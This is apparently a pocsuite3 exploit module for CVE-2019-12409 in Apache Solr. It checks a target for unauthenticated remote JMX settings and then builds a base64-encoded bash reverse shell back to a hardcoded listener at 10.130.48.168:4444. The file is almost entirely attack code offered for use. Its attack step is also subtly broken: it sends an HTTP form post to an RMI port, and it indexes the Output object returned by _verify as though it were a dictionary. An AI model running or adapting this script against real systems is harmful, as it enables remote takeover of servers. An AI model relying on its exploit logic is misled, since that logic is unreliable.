from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.lib.utils import random_str
import base64

class SolrJMXAttackPOC(POCBase):
    vulID = 'CVE-2019-12409'
    version = '1.0'
    author = 'mhb'
    vulDate = '2019-09-09'
    createDate = '2024-07-23'
    updateDate = '2024-07-23'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2019-12409']
    name = 'Apache Solr ENABLE_REMOTE_JMX_OPTS Attack PoC'
    appPowerLink = 'https://lucene.apache.org/solr/'
    appName = 'Apache Solr'
    appVersion = '8.1.1, 8.2.0'
    vulType = 'Remote Code Execution'
    desc = '''Attack mode to execute commands and get a reverse shell on Apache Solr using ENABLE_REMOTE_JMX_OPTS vulnerability.'''
    samples = []
    install_requires = ['requests']

    def __init__(self):
        super().__init__()
        self.lhost = '10.130.48.168'
        self.lport = 4444

    def _verify(self):
        result = {}
        target = self.url.rstrip('/')
        config_url = f'{target}/solr/admin/info/system'
        
        try:
            response = requests.get(config_url, timeout=5)
            if response.status_code == 200:
                json_data = response.json()
                
                # Extract JVM JMX command line arguments
                jvm_config = json_data.get('jvm', {})
                jmx_config = jvm_config.get('jmx', {})
                command_line_args = jmx_config.get('commandLineArgs', [])

                # Check for JMX-related configurations
                jmx_remote = '-Dcom.sun.management.jmxremote' in command_line_args
                jmx_local_only = '-Dcom.sun.management.jmxremote.local.only=false' in command_line_args
                jmx_ssl = '-Dcom.sun.management.jmxremote.ssl=false' in command_line_args
                jmx_authenticate = '-Dcom.sun.management.jmxremote.authenticate=false' in command_line_args
                jmx_port = any(arg.startswith('-Dcom.sun.management.jmxremote.port=') for arg in command_line_args)
                jmx_rmi_port = any(arg.startswith('-Dcom.sun.management.jmxremote.rmi.port=') for arg in command_line_args)

                if jmx_remote and jmx_local_only and jmx_ssl and jmx_authenticate and jmx_port and jmx_rmi_port:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = config_url
                    result['VerifyInfo']['JMX Configurations'] = command_line_args
                else:
                    print("JMX Configuration does not match the vulnerability criteria.")
            else:
                print("Failed to fetch system info or the system info structure is unexpected.")

        except Exception as e:
            print(f'Error: {e}')

        return self.parse_output(result)

    def _attack(self):
        # return self._verify()
        result = self._verify()
        if not result:
            return self.parse_output(result)
        
        target = self.url.rstrip('/')
        target_ip = target.split('//')[1].split(':')[0]
        rmi_port = 18983  # 默认 RMI 端口
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        encoded_payload = base64.b64encode(payload.encode()).decode()
        jmx_url = f"service:jmx:rmi:///jndi/rmi://{target_ip}:{rmi_port}/jmxrmi"

        try:
            # Use correct method to send payload
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {"payload": encoded_payload}
            response = requests.post(f"http://{target_ip}:{rmi_port}", headers=headers, data=data, timeout=10)
            if response.status_code == 200:
                result['AttackInfo'] = {}
                result['AttackInfo']['URL'] = jmx_url
                result['AttackInfo']['Payload'] = payload
                result['AttackInfo']['Response'] = response.text
        except Exception as e:
            logger.error(f'Error: {e}')

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Attack failed or target is not vulnerable')
        return output

register_poc(SolrJMXAttackPOC)

